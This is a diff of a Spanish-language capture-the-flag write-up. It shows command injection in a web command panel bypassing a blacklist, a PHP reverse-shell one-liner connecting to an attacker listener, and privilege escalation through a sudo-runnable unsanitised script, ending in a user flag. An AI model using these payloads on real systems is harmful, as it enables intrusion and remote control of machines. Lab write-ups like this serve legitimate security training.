@@ -66,10 +66,24 @@ Como se comentaba en el anterior apartado el panel de comandos no permite según
 
 <code>pwd;php --version</code>
 
-Con todo esto solo es necesario habilitar un puerto en escucha de la máquina atacante como se ha hecho en otras ocasiones. Y visistar la página de [*Pentestmonkey*](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) para obtener el código *php* para la *reverseshell*.
+Con todo esto solo es necesario habilitar un puerto en escucha de la máquina atacante como se ha hecho en otras ocasiones. Y visistar la página de [*Pentestmonkey*](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) para obtener el código *php* para la *reverseshell* que se introducirá en el panel.
 
 <code>nc -lvnp 1234</code>
 
 <code>pwd;php -r '$sock=fsockopen("10.23.92.113",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code>
 
-**Flag: **
+![Captura de pantalla 2025-04-13 205517](https://github.com/user-attachments/assets/9e321c4d-87e2-4b48-9847-503742a49d91)
+
+Hecho esto se consigue una *shell* y se comprueba que somos el usuario 'www-data'. En el directorio '/home' aparecen 3 usuarios, de los cuales se tiene acceso a la carpeta de 'apaar'. Dentro de esta, se encuentra un archivo 'local.txt' donde se encuentra el código *php* de la web del panel de comandos y se observa una *blacklist* con las palabras prohibidas para introducir, por las cuales saltaba anteriormente el mensaje de alerta. Pero más interesante es el archivo oculto'.helpline.sh', el cual es un *script* que pide introducir el nombre de la persona con la quie quieres hablar y el mensaje que le quieres dejar. Puesto que no se sanitizan las posibles entradas por teclado, esto se puede utilizar para hacer aparecer la *shell* de Apaar y de esta manera obtener acceso a su usuario.
+Para ello se ejecuta el archivo con la ruta absoluta y con el usuario 'apaar'. Para que al provocar la *shell*, esta sea la de este usuario. Esto mismo se consigue introduciendo como respuesta a las preguntas del código <code>/bin/bash</code>.
+
+<code>sudo -u apaar /home/apaar/.helpline.sh</code>
+
+
+Una vez hecho esto se comprueb el usuario alcanzado y su id.
+
+![image](https://github.com/user-attachments/assets/45d7d820-8d96-442d-9c63-f16b6a56bee9)
+
+
+
+**Flag: {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}**
